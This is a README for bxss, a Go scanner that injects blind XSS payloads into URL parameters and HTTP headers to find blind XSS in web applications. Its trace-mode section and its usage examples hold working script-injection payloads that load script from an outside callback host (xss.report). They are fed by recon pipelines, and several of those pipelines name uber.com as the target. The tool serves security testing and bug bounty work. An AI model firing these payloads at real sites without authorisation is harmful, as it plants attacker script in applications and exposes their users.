<h1 align="center">
  <br>
  <img src="https://github.com/ethicalhackingplayground/bxss/blob/master/static/blinded-drib.png" width="200px" alt="Bxss">
  <br>
  Bxss - Blind XSS Scanner
</h1>

<p align="center">
  <a href="https://github.com/ethicalhackingplayground/bxss/releases/latest">
    <img src="https://img.shields.io/github/v/release/ethicalhackingplayground/bxss?style=flat-square" alt="Version">
  </a>
  <a href="https://github.com/ethicalhackingplayground/bxss/blob/master/LICENSE">
    <img src="https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square" alt="License">
  </a>
  <a href="https://goreportcard.com/report/github.com/ethicalhackingplayground/bxss">
    <img src="https://goreportcard.com/badge/github.com/ethicalhackingplayground/bxss?style=flat-square" alt="Go Report Card">
  </a>
  <a href="https://pkg.go.dev/github.com/ethicalhackingplayground/bxss">
    <img src="https://pkg.go.dev/badge/github.com/ethicalhackingplayground/bxss.svg" alt="Go Reference">
  </a>
</p>

---

## 🚀 Description
Bxss is a high-performance Blind XSS scanner that automates the detection of blind XSS vulnerabilities in web applications.

---

## ✨ Features
- Injects Blind XSS payloads into custom headers & parameters
- Supports multiple HTTP methods (PUT, POST, GET, OPTIONS)
- High-speed scanning with concurrency support
- Easily chainable with other tools
- Simple installation and usage

---


## 🧠 In Progress

We're actively working on integrating a **Chromium-based worker pool** to enhance the performance of `bxss` on **low-end devices**.

This feature will allow resource-intensive tasks, like DOM-based XSS detection or post-trigger payload inspection, to be offloaded to lightweight Chromium instances managed via a pool. By distributing the workload across multiple headless browser contexts in a controlled and efficient manner, `bxss` will remain responsive and usable even on lower-spec machines.

This will make `bxss` not only powerful but also highly accessible, regardless of system constraints.

---

## ✅ TODOs
- [x] Chromium-based worker pool for DOM interaction and visual verification
- [ ] Optional HTML/JSON reporting output
- [ ] Add support for multi-platform payload customization (XSS Hunter, Interactsh, etc.)
- [ ] Proxy support
- [x] Import custom requests

---

## 🧪 Experimental Features
- Trace mode (experimental)

---

## 📦 Installation
```bash
go install -v github.com/ethicalhackingplayground/bxss/v2/cmd/bxss@latest
```

---

## ⚙️ Arguments

| Argument       | Description                                             | Default  |
| ------------- | -------------------------------------------------------- | -------- |
| `-a`          | Append the payload to the parameter                      | `false`  |
| `-c int`      | Set the concurrency level                                | `30`     |
| `-H string`   | Set a custom header                                      | `""`     |
| `-hf string`  | Path to file with headers                                | `""`     |
| `-p string`   | The blind XSS payload                                    | `""`     |
| `-pf string`  | Path to file with payloads                               | `""`     |
| `-t`          | Test parameters for blind XSS                            | `false`  |
| `-X string`   | HTTP method to use                                       | `""`  |
| `-v`          | Enable debug mode                                        | `false`  |
| `-rl float`   | Rate limit (requests per second)                         | `0`      |
| `-f`          | Follow redirects                                         | `false`  |
| `-l`          | Enable Trace Mode (experimental)                          | `false`  |
---

## 🎬 Demonstration
<p align="center">
  <a href="https://asciinema.org/a/mPB0Vms70kvD8dd99BwYi1ucm">
    <img src="https://asciinema.org/a/mPB0Vms70kvD8dd99BwYi1ucm.svg" alt="Demo">
  </a>
</p>

---

## 📝 What is Trace mode?
Trace mode is an experimental feature that allows you to track where the BlindXSS got triggered, some third party BlindXSS platforms such as [https://xss.report/](https://xss.report/) allows you to specify custom parameters in you're payloads, this allows you to track where the BlindXSS got triggered, for example if you specify the parameter `url=https://somehost.com` in your payload, the tool will use the payload 
```js
'"><script src=https://xss.report/c/username?url=https://somehost.com></script>'
```
for testing and upon a trigger you will be able to inspect the DOM and see what host the BlindXSS got triggered from.

 <img src="https://github.com/ethicalhackingplayground/bxss/blob/master/static/xss.report.png" alt="Xss Report">

Make sure when assigning custom parameters in you're dashboard that you assign `url={LINK}` so bxss can automatically replace `{LINK}` with the actual URL. 

## 🔥 Usage Examples

### Parameters
```bash
subfinder -d uber.com \
| gau \
| grep "&" \
| bxss -p '><script src=https://xss.report/c/username></script>' \
-t
```

### Append To Parameters
```bash
subfinder -d uber.com \
| gau \
| grep "&" \
| bxss -a -p '><script src=https://xss.report/c/username></script>' \
-t
```

### Both Headers & Parameters
```bash
subfinder -d uber.com \
| gau \
| grep "&" \
| bxss -p '><script src=https://xss.report/c/username></script>' \
-H "User-Agent" \
-t
```

### X-Forwarded-For Header
```bash
subfinder -d uber.com \
| gau \
| bxss -p '><script src=https://xss.report/c/username></script>' \
-H "X-Forwarded-For"
```

### Custom Headers & Parameters
```bash
echo uber.com \
| haktrails subdomains \
| httpx \
| hakrawler -u \
| bxss -p '><script src=https://xss.report/c/username></script>' \
-H "User-Agent" \
-t
```

### Google Dorks With Dorki
```bash
curl -X GET -H "Authorization: Bearer <Token>" \
-H "X-Secret-Key: <Secret>" \
https://dorki.attaxa.com/api/search?q=site:example.com -s \
| jq -r .[][].url \
| grep "&" \
| bxss -a -p '><script src=https://xss.report/c/username></script>'
```

### Custom Headers & Parameters With Rate Limit
```bash
echo uber.com \
| haktrails subdomains \
| httpx \
| hakrawler -u \
| bxss -a -p '><script src=https://xss.report/c/username></script>' \
-H "User-Agent" \ 
-t \
-rl 10
```

### Using Chromium Browser Pool
```bash
# Scan with a pool of 4 Chrome browsers for DOM-based detection
cat urls.txt | bxss -p '><script src=https://xss.report/c/username></script>' \
-browser chromium \
-workers 4
```

### Using Custom Request File
```bash
# Process all requests in the file with the specified payload
bxss -request requests.txt -p '><script src=https://xss.report/c/username></script>'
```

For advanced dorking and vulnerability exploration, check out [Dorki](https://dorki.attaxa.com/) and sign up today!

---

## ☕ Support the Project
If you get a bounty using this tool, consider supporting by buying me a coffee!

<p align="center">
  <a href="https://buymeacoffee.com/zoidsec" target="_blank">
    <img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;">
  </a>
</p>

